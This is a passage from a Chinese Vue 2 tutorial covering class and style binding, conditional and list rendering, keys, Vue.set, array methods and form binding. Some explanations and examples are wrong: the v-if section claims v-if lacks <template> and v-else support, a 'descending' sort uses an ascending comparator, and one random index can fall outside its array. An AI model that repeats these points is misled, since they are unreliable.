</script>
</html>
```



### 8.简写形式



当我们监视的属性很简单，而且只用到了handle属性，那么我们可以简写



```java
<script type="text/javascript">
  const  vm = new Vue({
        el: '#root',
        data: {
            isHost: true
        }, computed: {
            info() {
                return this.isHost ? '炎热' : '凉爽';
            }
        }, methods: {
            changeInfo() {
                this.isHost = !this.isHost
            }
        }, watch: {
            isHost(newArg,oldArg){
                console.log("发生了改变"+newArg,oldArg)
            }
     /*       isHost: {
                handler(newArg,oldArg) {
                    console.log("发生了改变"+newArg,oldArg)
                }
            }*/
        }
    })
    //正常写法
    /* vm.$watch('isHot',{
        immediate:true, //初始化时让handler调用一下
        deep:true,//深度监视
        handler(newValue,oldValue){
            console.log('isHot被修改了',newValue,oldValue)
        }
    }) */

    //简写
    /* vm.$watch('isHot',(newValue,oldValue)=>{
        console.log('isHot被修改了',newValue,oldValue,this)
    }) */
</script>
```





# 四、VUE基础(三)



## 4.1：CSS绑定



### 1.准备css样式



```java
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>demo</title>
  <script type="text/javascript" src="../js/vue.js"></script>
  <style>
    .basic{
      width: 400px;
      height: 100px;
      border: 1px solid black;
    }

    .happy{
      border: 4px solid red;;
      background-color: rgba(255, 255, 0, 0.644);
      background: linear-gradient(30deg,yellow,pink,orange,yellow);
    }
    .sad{
      border: 4px dashed rgb(2, 197, 2);
      background-color: gray;
    }
    .normal{
      background-color: skyblue;
    }

    .xht1{
      background-color: yellowgreen;
    }
    .xht2{
      font-size: 30px;
      text-shadow:2px 2px 10px red;
    }
    .xht3{
      border-radius: 20px;
    }
  </style>
</head>
<body>
<div id="root">
  <div>hello {{name}}</div>
</div>
</body>

<script type="text/javascript">
  new Vue({
    el:'#root',
    data:{
      name:'小糊涂'
    }
  })
</script>
</html>
```





### 2.简介



1. `:class`='xxx'  v-bind:class=‘xxx’

2. 表达式是字符串: 'classA' 

3. 表达式是对象: {classA:isA, classB: isB}

4. 表达式是数组: ['classA', 'classB'] 



### 3.案例



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
        .basic {
            width: 400px;
            height: 100px;
            border: 1px solid black;
        }

        .happy {
            border: 4px solid red;;
            background-color: rgba(255, 255, 0, 0.644);
            background: linear-gradient(30deg, yellow, pink, orange, yellow);
        }

        .sad {
            border: 4px dashed rgb(2, 197, 2);
            background-color: gray;
        }

        .normal {
            background-color: skyblue;
        }

        .xht1 {
            background-color: yellowgreen;
        }

        .xht2 {
            font-size: 30px;
            text-shadow: 2px 2px 10px red;
        }

        .xht3 {
            border-radius: 20px;
        }
    </style>
</head>
<body>
<div id="root">
    <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
    <div class="basic" :class="mood" @click="changeMood">{{name}}</div>
    <br/><br/>
    <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
    <div class="basic" :class="classArr">{{name}}</div>
    <br/><br/>
    <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
    <div class="basic" :class="classObj">{{name}}</div>
    <br/><br/>
</div>
</body>

<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: '小糊涂',
            mood: 'normal',
            classArr: ['xht1', 'xht2', 'xht3'],
            classObj: {
                xht1: true,
                xht2: true,
            },

        }, methods: {
            changeMood() {
                const arr = ['happy', 'sad', 'normal']
                const index = Math.floor(Math.random() * 4)
                this.mood = arr[index]
            }
        },
    })
</script>
</html>
```



## 4.2：stryle操作



### 1.简介



1. `:style`="{ color: activeColor, fontSize: fontSize + 'px' }" 

2. 其中 activeColor/fontSize 是 data 属性
3. `:style="{fontSize: xxx}"`xxx是动态值。
4. `:style="[a,b]"`其中a、b是样式对象。



### 2.案例



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
        .basic {
            width: 400px;
            height: 100px;
            border: 1px solid black;
        }

        .happy {
            border: 4px solid red;;
            background-color: rgba(255, 255, 0, 0.644);
            background: linear-gradient(30deg, yellow, pink, orange, yellow);
        }

        .sad {
            border: 4px dashed rgb(2, 197, 2);
            background-color: gray;
        }

        .normal {
            background-color: skyblue;
        }

        .xht1 {
            background-color: yellowgreen;
        }

        .xht2 {
            font-size: 30px;
            text-shadow: 2px 2px 10px red;
        }

        .xht3 {
            border-radius: 20px;
        }
    </style>
</head>
<body>
<div id="root">
    <!-- 绑定style样式--对象写法 -->
    <div class="basic" :style="styleObj">{{name}}</div>
    <br/><br/>
    <!-- 绑定style样式--数组写法 -->
    <div class="basic" :style="styleArr">{{name}}</div>
    <br/><br/>
</div>
</body>

<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: '小糊涂',
            styleObj: {
                fontSize: '40px',
                color: 'red',
            },
            styleObj2: {
                backgroundColor: 'orange'
            },
            styleArr: [
                {
                    fontSize: '40px',
                    color: 'blue',
                },
                {
                    backgroundColor: 'gray'
                }
            ]

        }, methods: {
            changeMood() {
                const arr = ['happy', 'sad', 'normal']
                const index = Math.floor(Math.random() * 4)
                this.mood = arr[index]
            }
        },
    })
</script>
</html>
```





<img src="images/image-20211217194355002.png" alt="image-20211217194355002" style="zoom:80%;" />

## 4.3：条件渲染



### 1.v-show



>  `v-show` **的元素始终会被渲染并保留在 DOM 中**。`v-show` 只是简单地切换元素的 CSS property `display`。
>
> 注意，`v-show` 不支持 `<template>` 元素，也不支持 `v-else`。



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <button @click="flag=!flag">点击我看效果</button>
    <button @click="count+=1">点击我看效果</button>
    <h1 v-show="flag">hello 小明</h1>
    <h1 v-show="count % 2 === 0">hello 小红</h1>
</div>
</body>
<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            flag: true,
            count: 1
        }
    })
</script>
</html>
```



### 2.v-if



> `v-if` 指令用于条件性地渲染一块内容。这块内容只会在指令的表达式返回 truthy 值的时候被渲染。
>
>  `v-if` **的元素始终会被渲染不会保留在 DOM 中**。
>
> 注意，`v-if` 不支持 `<template>` 元素，也不支持 `v-else`。
>
> ```java
> <h1 v-if="awesome">Vue is awesome!</h1>
> ```



```java
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8"/>
  <title>demo</title>
  <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
  <button @click="flag=!flag">点击我看效果</button>
  <button @click="count+=1">点击我看效果</button>
  <h1 v-if="flag">hello 小明</h1>
  <h1 v-if="count % 2 === 0">hello 小红</h1>

</div>
</body>

<script type="text/javascript">
  new Vue({
    el: '#root',
    data: {
      flag: true,
      count: 1
    }
  })
</script>
</html>
```



### 3.v-else和v-else-if



> + `v-else-if`，顾名思义，充当 `v-if` 的“else-if 块”，可以连续使用：
>
> + 你可以使用 `v-else` 指令来表示 `v-if` 的“else 块”：
>
> + `v-else` 元素必须紧跟在带 `v-if` 或者 `v-else-if` 的元素的后面，否则它将不会被识别。



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <button @click="count+=1">点击我看效果{{count}}</button>
    <h1 v-if="count  === 1">hello 小红</h1>
    <h1 v-else-if="count  === 2">hello 小明</h1>
    <h1 v-else-if="count  === 3">hello 小刚</h1>
    <h1 v-else-if="count  === 4">hello 张三、李四、王五</h1>
    <h1 v-else>hello 小糊涂</h1>
</div>
</body>
<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            flag: true,
            count: 0
        }
    })
</script>
</html>
```





### 4.v-if与template的配合使用



```java
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8"/>
  <title>demo</title>
  <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
  <!-- v-if与template的配合使用 -->
  <template v-if="flag">
    <h2>张三</h2>
    <h2>李四</h2>
    <h2>王五</h2>
  </template>
  <div v-if="flag">
    <h2>张三</h2>
    <h2>李四</h2>
    <h2>王五</h2>
  </div>
</div>
</body>

<script type="text/javascript">
  new Vue({
    el: '#root',
    data: {
      flag: true,
      count: 1
    }
  })
</script>
</html>
```
<img src="images/image-20211217200726817.png" alt="image-20211217200726817" style="zoom:80%;" />





### 5.v-if 和v-show



+ `v-if` 是“真正”的条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建。

+ `v-if` 也是**惰性的**：如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块。

+ 相比之下，`v-show` 就简单得多——不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。

+ 一般来说，`v-if` 有更高的切换开销，而 `v-show` 有更高的初始渲染开销。因此，如果需要非常频繁地切换，则使用 `v-show` 较好；如果在运行时条件很少改变，则使用 `v-if` 较好。

> 1. 如果需要频繁切换 v-show 较好 
>
> 2. 当条件不成立时, v-if 的所有子节点不会解析(项目中使用)



## 4.4：列表渲染



### 1.v-for简介



v-for指令:
						1.用于展示列表数据
						2.语法：v-for="(item, index) in xxx" :key="yyy"
						3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）



### 2.案例



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>demo</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h1>hello {{name}}</h1>
    <h2>遍历数组</h2>
    <ul>
        <li>id---name---pwd</li>
        <li :id="item.id" v-for="item in users">{{item.id}}---{{item.name}}---{{item.pass}}</li>
    </ul>
    <h2>遍历数组--带索引</h2>
    <ul>
        <li>index---id---name---pwd</li>
        <li :id="index" v-for="(item,index) in users">{{index}}---{{item.id}}---{{item.name}}---{{item.pass}}</li>
    </ul>
    <h2>遍历对象</h2>
    <ul>
        <li v-for="(value,key) in user">{{key}}---{{value}}</li>
    </ul>
    <h2>遍历字符串</h2>
    <ul>
        <li v-for="value in str">{{value}}</li>
    </ul>
    <h2>遍历字符串带索引</h2>
    <ul>
        <li v-for="(value ,index) in str">{{index}}---{{value}}</li>
    </ul>
</div>
</body>

<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: '小糊涂',
            user: {
                id: 1,
                name: 'admin',
                pass: 'admin'
            }, users: [
                {id: 1, name: '张三', pass: 'admin'},
                {id: 2, name: '李四', pass: 'admin'},
                {id: 3, name: '王五', pass: 'admin'}
            ],
            str: 'hello'

        }
    })
</script>
</html>
```



### 3.维护状态·key



当 Vue 正在更新使用 `v-for` 渲染的元素列表时，它默认使用“就地更新”的策略。如果数据项的顺序被改变，Vue 将不会移动 DOM 元素来匹配数据项的顺序，而是就地更新每个元素，并且确保它们在**每个索引位置正确渲染**。这个类似 Vue 1.x 的 `track-by="$index"`。

这个默认的模式是高效的，但是**只适用于不依赖子组件状态或临时 DOM 状态 (例如：表单输入值) 的列表渲染输出**。

为了给 Vue 一个提示，以便它能跟踪每个节点的身份，从而重用和重新排序现有元素，你需要为每项提供一个唯一 `key` attribute：

```java
<div v-for="item in items" v-bind:key="item.id">
  <!-- 内容 -->
</div>
```



+ 建议尽可能在使用 `v-for` 时提供 `key` attribute，除非遍历输出的 DOM 内容非常简单，或者是刻意依赖默认行为以获取性能上的提升。

+ 因为它是 Vue 识别节点的一个通用机制，`key` 并不仅与 `v-for` 特别关联。后面我们将在指南中看到，它还具有其它用途。

+ 不要使用对象或数组之类的非基本类型值作为 `v-for` 的 `key`。请用字符串或数值类型的值。



### 4.key的问题重现



我们在使用key的时候我们如果这样写：

```java
 <li :id="index" v-for="(item,index) in users" :key="index">{{item.name}}:<input type="text" value=""></li>
```

使用数据的索引来做key，但是是有问题的：下面案例：



> #### 代码：
>
> ```java
> <!DOCTYPE html>
> <html>
> <head>
>     <meta charset="UTF-8"/>
>     <title>demo</title>
>     <script type="text/javascript" src="../js/vue.js"></script>
> </head>
> <body>
> <div id="root">
>     <h1>hello {{name}}</h1>
>     <h2>
>         <button @click="addPrefix">在第一个节点前面增加节点</button>
>         <button @click="addSufix">在最后一个节点增加节点</button>
>         <button @click="delPrefix">删除第一个节点</button>
>         <button @click="delSufix">删除最后一个节点</button>
>     </h2>
>     <ul>
>         <li>index---id---name---pwd</li>
>         <li :id="index" v-for="(item,index) in users" :key="index">{{item.name}}:<input type="text" value=""></li>
>     </ul>
> 
> </div>
> </body>
> 
> <script type="text/javascript">
>     new Vue({
>         el: '#root',
>         data: {
>             name: '小糊涂',
>             count: 3,
>             users: [
>                 {id: 1, name: '张三', pass: 'admin'},
>                 {id: 2, name: '李四', pass: 'admin'},
>                 {id: 3, name: '王五', pass: 'admin'}
>             ]
>         }, methods: {
>             addPrefix() {
>                 this.users.unshift({id: this.count++, name: "测试", pass: "admin"})
>             },
>             addSufix() {
>                 this.users.push({id: this.count++, name: "测试", pass: "admin"})
>             },
>             delPrefix() {
>                 this.users.shift()
>             },
>             delSufix() {
>                 this.users.pop()
>             }
>         }
>     })
> </script>
> </html>
> ```
>
> #### 效果测试
>
> <img src="images/image-20211220194900128.png" alt="image-20211220194900128" style="zoom:80%;" />



### 5.key的问题解决



1.最好使用每条数据的**唯一标识**作为key, 比如id、手机号、身份证号、学号等唯一值。

2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，**仅用于渲染列表用于展示，使用index作为key是没有问题的。**



<img src="images/image-20211220195006230.png" alt="image-20211220195006230" style="zoom:80%;" />



### 6.key的总结




1. 虚拟DOM中key的作用：
   
    1. key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】,随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
2. 对比规则：

     1. 旧虚拟DOM中找到了与新虚拟DOM相同的key：

          1. 若虚拟DOM中内容没变, 直接使用之前的真实DOM！
          2.  ②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
     3. 旧虚拟DOM中未找到与新虚拟DOM相同的key,创建新的真实DOM，随后渲染到到页面。
3. 用index作为key可能会引发的问题：
    1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作: 会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
    2. 如果结构中还包含输入类的DOM：  会产生错误DOM更新 ==> 界面有问题。
4. 开发中如何选择key?

    1. 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
    2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。



### 7.列表过滤



#### 效果

输入框输入内容显示相关内容

<img src="images/image-20211220195900658.png" alt="image-20211220195900658" style="zoom:80%;" />

#### 代码



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>列表过滤</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<!-- 准备好一个容器-->
<div id="root">
    <h2>人员列表</h2>
    <input type="text" placeholder="请输入名字" v-model="keyWord">
    <ul>
        <li v-for="(p,index) of filPerons" :key="index">
            {{p.name}}-{{p.age}}-{{p.sex}}
        </li>
    </ul>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false
    //用watch实现
    //#region
    /* new Vue({
        el:'#root',
        data:{
            keyWord:'',
            persons:[
                {id:'001',name:'马冬梅',age:19,sex:'女'},
                {id:'002',name:'周冬雨',age:20,sex:'女'},
                {id:'003',name:'周杰伦',age:21,sex:'男'},
                {id:'004',name:'温兆伦',age:22,sex:'男'}
            ],
            filPerons:[]
        },
        watch:{
            keyWord:{
                immediate:true,
                handler(val){
                    this.filPerons = this.persons.filter((p)=>{
                        return p.name.indexOf(val) !== -1
                    })
                }
            }
        }
    }) */
    //#endregion

    //用computed实现
    new Vue({
        el:'#root',
        data:{
            keyWord:'',
            persons:[
                {id:'001',name:'马冬梅',age:19,sex:'女'},
                {id:'002',name:'周冬雨',age:20,sex:'女'},
                {id:'003',name:'周杰伦',age:21,sex:'男'},
                {id:'004',name:'温兆伦',age:22,sex:'男'}
            ]
        },
        computed:{
            filPerons(){
                return this.persons.filter((p)=>{
                    return p.name.indexOf(this.keyWord) !== -1
                })
            }
        }
    })
</script>
</html>
```



### 8.列表排序



#### 效果

如下我们可以对数据进行排序

<img src="images/image-20211220200131070.png" alt="image-20211220200131070" style="zoom:80%;" />

#### 代码



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>列表排序</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<!-- 准备好一个容器-->
<div id="root">
    <h2>人员列表</h2>
    <input type="text" placeholder="请输入名字" v-model="keyWord">
    <button @click="sortType = 2">年龄升序</button>
    <button @click="sortType = 1">年龄降序</button>
    <button @click="sortType = 0">原顺序</button>
    <ul>
        <li v-for="(p,index) of filPerons" :key="p.id">
            {{p.name}}-{{p.age}}-{{p.sex}}
            <input type="text">
        </li>
    </ul>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            keyWord:'',
            sortType:0, //0原顺序 1降序 2升序
            persons:[
                {id:'001',name:'马冬梅',age:30,sex:'女'},
                {id:'002',name:'周冬雨',age:31,sex:'女'},
                {id:'003',name:'周杰伦',age:18,sex:'男'},
                {id:'004',name:'温兆伦',age:19,sex:'男'}
            ]
        },
        computed:{
            filPerons(){
                const arr = this.persons.filter((p)=>{
                    return p.name.indexOf(this.keyWord) !== -1
                })
                //判断一下是否需要排序
                if(this.sortType){
                    arr.sort((p1,p2)=>{
                        return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
                    })
                }
                return arr
            }
        }
    })

</script>
</html>
```



## 4.5：vue的set



+ **语法**

```java
Vue.set( target, propertyName/index, value )
```

- **参数**：

  - `{Object | Array} target`
  - `{string | number} propertyName/index`
  - `{any} value`

- **返回值**：设置的值。

- **用法**：

  向响应式对象中添加一个 property，并确保这个新 property 同样是响应式的，且触发视图更新。它必须用于向响应式对象上添加新 property，因为 Vue 无法探测普通的新增 property (比如 `this.myObject.newProperty = 'hi'`)

  > 注意对象不能是 Vue 实例，或者 Vue 实例的根数据对象。

```java
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue监测数据改变的原理</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学生信息</h1>
			<button @click="addSex">添加一个性别属性，默认值是男</button>
			<h2>姓名：{{student.name}}</h2>
			<h2 v-if="student.sex">性别：{{student.sex}}</h2>
			<h2>年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		const vm = new Vue({
			el:'#root',
			data:{
				student:{
					name:'tom',
					age:{
						rAge:40,
						sAge:29,
					}
				}
			},
			methods: {
				addSex(){
					this.$set(this.student,'sex','男')
				}
			}
		})
	</script>
</html>
```



## 4.6：数据的更新检测



> 列表的渲染和vue中的set方法结合说数组检测



### 1.数组使用回忆



> 数据是原生js中的，我们看一下他的使用方法：



#### 创建数组



```java
var arr = new Array();  // 创建一个数组
var arr = new Array([size]);  // 创建一个数组并指定长度，注意不是上限，是长度
var arr = new Array(element0, element1, ..., elementn);  // 创建一个数组并赋值
var arr = [] // 字面量创建数组
var arr = Array.of(element0, element1, ..., elementn)  // 将一组值转换成数组
```



#### Array.from()伪数组变成数组



将伪数组变成数组，就是只要有length的属性就可以转成数组

```java
let name = "javascript";
console.log(name.length); // 10

let arr = Array.from(name);
console.log(arr); // [ 'j', 'a', 'v', 'a', 's', 'c', 'r', 'i', 'p', 't' ]
```



#### Array.of()转换成数组



将一组值转换成数组，类似于声明数组

```java
let arr = Array.of(10);
let arr2 = Array.of("hello", "world");

console.log(arr); // [ 10 ] 
console.log(arr2); // [ 'hello', 'world' ]
```



#### push()添加到数组末尾



可以接收任意数量的参数，把它们逐个添加到数组末尾，并返回修改后数组的长度

```java
let arr = [1, 2, 3];
arr.push(4);

console.log(arr); // [ 1, 2, 3, 4 ]
console.log(arr.length); // 4
```



#### pop()数组末尾移除



从数组末尾移除最后一项，减少数组的length值，然后返回移除的项

```java
let arr = [1, 2, 3];
let delVal = arr.pop();

console.log(arr); // [ 1, 2]
console.log(delVal); // 3
```



#### shift()移除数组中的第一个



移除数组中的第一个项并返回该项，同时将数组长度减1

```java
let arr = [1, 2, 3];
let delVal = arr.shift();

console.log(delVal); // 1
console.log(arr); // [ 2, 3 ]
console.log(arr.length); // 2
```



#### unshift()数组前端添加任意个项



在数组前端添加任意个项并返回新数组的长度

```text
let arr = [1, 2, 3];
let arrLength = arr.unshift(0);

console.log(arrLength); // 4
console.log(arr); // [ 0, 1, 2, 3 ]
```



#### reverse()反转数组项的顺序



反转数组项的顺序

```text
let arr = [1, 2, 3];
arr.reverse();

console.log(arr); // [ 3, 2, 1 ]
```



#### sort()排序



从小到大排序，但它的排序方法是根据数组转换字符串后来排序的



```java
let arr = [1, 5, 10, 15];
// 从小到大排序
console.log(arr.sort((p1,p2)=>{
    return p1-p2;
})); // [ 1, 5, 10, 15 ]
// 从大到小排序
console.log(arr.sort((p1,p2)=>{
    return p1-p2;
})); // [ 1, 5, 10, 15 ]
```





#### concat()合并数组



可以基于当前数组中的所有项创建一个新数组，不会影响原数组的值

```java
let arr = [1, 2, 3];
let newArr = arr.concat([4, 5, 6], [7, 8, 9]);

console.log(newArr); // [ 1, 2, 3, 4, 5, 6, 7, 8, 9 ]
console.log(arr); // [1, 2, 3]
```



#### arr.fill(target, start, end)插入值



使用给定的值，填充一个数组,ps:填充完后会改变原数组

- target – 待填充的元素
- start – 开始填充的位置-索引
- end – 终止填充的位置-索引（不包括该位置)

```java
let arr = [1, 2, 3, 4];
let arr2 = [5, 6, 7, 8];

// 全部填充5
arr.fill(5);
console.log(arr); // [ 5, 5, 5, 5 ]

// 从索引为1到3填充9
arr2.fill(9, 1, 3);
console.log(arr2); // [ 5, 9, 9, 8 ]
```



#### Array.isArray(arr)判断是否为数组

判断传入的值是否为数组

```java
let arr = [];
let obj = {};

console.log(Array.isArray(arr)); // true
console.log(Array.isArray(obj)); // false
```



#### indexOf()和lastIndexOf()查询数据位置



这两个方法都接收两个参数：要查找的项和（可选的）表示查找起点位置的索引。其中，`indexOf()`方法从数组的开头（位置0）开始向后查找，`lastIndexOf()`方法则从数组的末尾开始向前查找。

```java
let arr = [1, 2, 3, 2, 1];

// 从0开始查询值为2的位置
console.log(arr.indexOf(2)); // 1
// 从索引为2开始查询值为2的位置
console.log(arr.indexOf(2, 2)); // 3

// 倒叙查询值为2的位置
console.log(arr.lastIndexOf(2)); // 3
// 倒叙查询值为2的位置
console.log(arr.lastIndexOf(2, 2)); // 1
```



#### find()查询数据是否存在



数组实例的find方法，用于找出第一个符合条件的数组成员。它的参数是一个回调函数，所有数组成员依次执行该回调函数，直到找出第一个返回值为true的成员，然后返回该成员。如果没有符合条件的成员，则返回undefined。

```java
let arr = [1, 2, 3, 4, 5, 6];

let index = arr.find(val => val === 3);
let index2 = arr.find(val => val === 100);

console.log(index); // 3
console.log(index2); // undefined
```



#### findIndex()同上



和数组实例的findIndex方法的用法与find方法非常类似，返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回-1。

```java
let arr = [1, 2, 3, 4, 5, 6];
let index = arr.findIndex(val => val === 3);
let index2 = arr.findIndex(val => val === 100);
console.log(index); // 2
console.log(index2); // -1
```



#### includes()数组是否包含给定的值



方法返回一个布尔值，表示某个数组是否包含给定的值，与字符串的includes方法类似。

```java
let arr = [1, 2, 3, 4, 5, 6];

console.log(arr.includes(3)); // true
console.log(arr.includes(100)); // false
```



#### 迭代方法数组





> **every()**



对数组中的每一项运行给定函数，如果该函数对每一项都返回true，则返回true。

```java
let arr = [1, 2, 3, 4, 5, 6];

// 是否所有的值都大于3
let isTrue = arr.every(value => value > 3);
console.log(isTrue); // false;
```



> **filter()**



对数组中的每一项运行给定函数，返回该函数会返回true的项组成的数组。

```java
let arr = [1, 2, 3, 4, 5, 6];

// 取数组中大于3的值重新组成新数组
let newArr = arr.filter(value => value > 3);
console.log(newArr); // [ 4, 5, 6 ]
```



> **forEach()**



对数组中的每一项运行给定函数。这个方法没有返回值。

```java
let arr = [1, 2, 3, 4, 5, 6];

// 迭代数组的每一项
arr.forEach((item, index) => {
  console.log(item); // 1, 2, 3, 4, 5, 6
})
```



> **map()**



对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。

```java
let arr = [1, 2, 3, 4, 5, 6];

// 迭代数组每个值加上100返回新数组
let newArr = arr.map(val => val + 100);
console.log(newArr); // [ 101, 102, 103, 104, 105, 106 ]
```



> **some()**



对数组中的每一项运行给定函数，如果该函数对任一项返回true，则返回true。

```java
let arr = [1, 2, 3, 4, 5, 6];

// 迭代数组的每一项，只要有一项符合条件就返回true
let isTrue = arr.some(val => val >= 5);
let isTrue2 = arr.some(val => val > 6);

console.log(isTrue); // true
console.log(isTrue2); // false
```



> **reduce()和reduceRight()**



这两个方法都会迭代数组的所有项，然后构建一个最终返回的值。其中，reduce()方法从数组的第一项开始，逐个遍历到最后。而reduceRight()则从数组的最后一项开始，向前遍历到第一项。

```java
let arr = [1, 2, 3, 4];

// 从左到右累加结果
let result = arr.reduce((val1, val2) => {
  return val1 + val2;
});

console.log(result); // 10
```



> **entries()，keys() 和 values()**



ES6 提供三个新的方法——entries()，keys()和values()——用于遍历数组。它们都返回一个遍历器对象，可以用for…of循环进行遍历，唯一的区别是keys()是对键名的遍历、values()是对键值的遍历，entries()是对键值对的遍历。

```java
let arr = [1, 2, 3];

// entries()是对键值对的遍历
for (let val of arr.entries()) {
  console.log(val);
  /**
   [ 0, 1 ]
   [ 1, 2 ]
   [ 2, 3 ]
   */
}

// keys()是对键名的遍历
for (let val of arr.keys()) {
  console.log(val); // 0 1 2
}

// values()是对键值的遍历
for (let val of arr.values()) {
  console.log(val); // 1 2 3
}
```



### 2.vue如何检测





Vue 不能检测以下数组的变动：

1. 当你利用索引直接设置一个数组项时，例如：`vm.items[indexOfItem] = newValue`
2. 当你修改数组的长度时，例如：`vm.items.length = newLength`



举个例子：

```java
var vm = new Vue({
  data: {
    items: ['a', 'b', 'c']
  }
})
vm.items[1] = 'x' // 不是响应性的
vm.items.length = 2 // 不是响应性的
```

为了解决第一类问题，以下两种方式都可以实现和 `vm.items[indexOfItem] = newValue` 相同的效果，同时也将在响应式系统内触发状态更新：

```java
// Vue.set
Vue.set(vm.items, indexOfItem, newValue)
// Array.prototype.splice
vm.items.splice(indexOfItem, 1, newValue)
```

你也可以使用 [`vm.$set`](https://cn.vuejs.org/v2/api/#vm-set) 实例方法，该方法是全局方法 `Vue.set` 的一个别名：

```java
vm.$set(vm.items, indexOfItem, newValue)
```

为了解决第二类问题，你可以使用 `splice`：

```java
vm.items.splice(newLength)
```



## 4.7：收集表单数据



### 1.接收表单



```java
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>收集表单数据</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <form @submit.prevent="demo">
        账号：<input type="text" v-model="user.name"><br>
        密码：<input type="password" v-model="user.pass"><br>
        描述： <textarea v-model="user.message"></textarea><br>
        爱好：
        <input type="checkbox" v-model="user.loves" value="抽烟">抽烟
        <input type="checkbox" v-model="user.loves" value="喝酒">喝酒
        <input type="checkbox" v-model="user.loves" value="美女">美女<br>
        性别：
        <input type="radio" v-model="user.sex" value="男">男
        <input type="radio" v-model="user.sex" value="女">女<br>
        学历
        <select v-model="user.selected">
            <option disabled value="">请选择</option>
            <option value="1">一年级</option>
            <option value="2">二年级</option>
            <option value="3">三年级</option>
        </select><br>
        <input type="checkbox" v-model="user.agree">阅读并接受<a href="http://www.baidu.com">《用户协议》</a>
        <button>提交</button>
    </form>
    <hr>
    <p v-for="(value,key) in user" :key="key">{{key}}:{{value}}</p>
    <hr>
    {{jsonMethod}}
</div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data: {
            user: {
                name: 'admin',
                pass: 'admin',
                message: '',
                loves: ['抽烟'],
                sex: '男',
                selected: '1',
                agree: null,
            },
            jsonMethod:null
        },
        methods: {
            demo(){
                this.jsonMethod =JSON.stringify(this.user)
            }
        }
    })
</script>
</html>
```



### 2.复选框值绑定



```java
<input
  type="checkbox"
  v-model="toggle"
  true-value="yes"
  false-value="no"
>
// 当选中时
vm.toggle === 'yes'
// 当没有选中时
vm.toggle === 'no'
```

这里的 `true-value` 和 `false-value` attribute 并不会影响输入控件的 `value` attribute，因为浏览器在提交表单时并不会包含未被选中的复选框。如果要确保表单中这两个值中的一个能够被提交，(即“yes”或“no”)，请换用单选按钮。



### 3.单选按钮绑定



```java
<input type="radio" v-model="pick" v-bind:value="a">
// 当选中时
vm.pick === vm.a
```



### 4.下拉框值绑定



```java
<select v-model="selected">
    <!-- 内联对象字面量 -->
  <option v-bind:value="{ number: 123 }">123</option>
</select>
// 当选中时
typeof vm.selected // => 'object'
vm.selected.number // => 123
```



### 5.修饰符



#### .lazy



在默认情况下，`v-model` 在每次 `input` 事件触发后将输入框的值与数据进行同步 (除了[上述](https://cn.vuejs.org/v2/guide/forms.html#vmodel-ime-tip)输入法组合文字时)。你可以添加 `lazy` 修饰符，从而转为在 `change` 事件_之后_进行同步：

```java
<!-- 在“change”时而非“input”时更新 -->
